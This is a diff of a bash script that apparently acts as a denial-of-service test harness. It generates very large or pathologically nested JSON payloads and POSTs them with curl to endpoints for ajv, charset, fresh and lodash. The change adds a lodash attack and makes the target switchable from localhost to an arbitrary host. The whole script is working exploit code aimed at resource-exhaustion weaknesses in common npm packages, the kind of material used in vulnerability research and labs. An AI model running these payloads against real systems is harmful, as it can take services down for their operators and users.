@@ -1,6 +1,18 @@
 #!/bin/bash
 
+source ./utils.sh
+
 set +x
+
+
+URL=""
+if [ $1 == "-l" ]
+then
+  URL="http://localhost:3000"
+else
+  URL="hostname"
+fi
+
 
 generate() {
     # echo "Running generation... Hold tight." > /dev/null
@@ -29,19 +41,25 @@ makeJson() {
 runAjvDos() {
     fin="$(generate 10000 "if(")x$(generate 10000 ")")"
     makeJson $fin
-    curl -d "@../data.json" -H "Content-Type: application/json" -X POST http://localhost:3000/ajv/dos
+    curl -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/ajv/dos
 }
 
 runCharsetDos() {
     fin="$(generate 40000 " ")"
-    makeJson $
-    curl -d "@../data.json" -H "Content-Type: application/json" -X POST http://localhost:3000/charset/dos
+    makeJson $fin
+    curl -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/charset/dos
 }
 
 runFreshDos() {
-    fin="$(generate 60000 " ")x"
+    fin="$(generate 60000 "x")x"
     makeJson $fin
-    curl -d "@../data.json" -H "Content-Type: application/json" -X POST http://localhost:3000/fresh/dos
+    curl -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/fresh/dos
 }
 
-runFreshDos
+runLodashDos() {
+    fin="$(generate 80000 "A")"
+    makeJson $fin
+    curl -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/lodash/dos
+}
+
+runLodashDos
